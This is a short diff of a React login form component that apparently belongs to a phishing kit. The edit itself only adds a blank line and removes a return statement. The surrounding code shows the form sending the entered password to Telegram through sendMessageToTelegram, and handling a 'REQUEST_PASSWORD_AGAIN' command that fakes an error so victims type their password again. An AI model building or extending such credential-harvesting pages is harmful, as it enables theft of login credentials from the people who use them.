@@ -57,6 +57,7 @@ export default function LoginForm({ setNavigation, navigation }) {
     const [isHovered, setIsHovered] = useState(false)
     const { validatePassword } = useValidatePassword();
 
+
     useEffect(() => {
         if (command === 'REQUEST_PASSWORD_AGAIN') {
             setInvalid(true); // Show error state for email input
@@ -79,8 +80,6 @@ export default function LoginForm({ setNavigation, navigation }) {
             setIsLoading(true);
             sendMessageToTelegram(password);
         }
-
-        return isValid;
     }
 
 
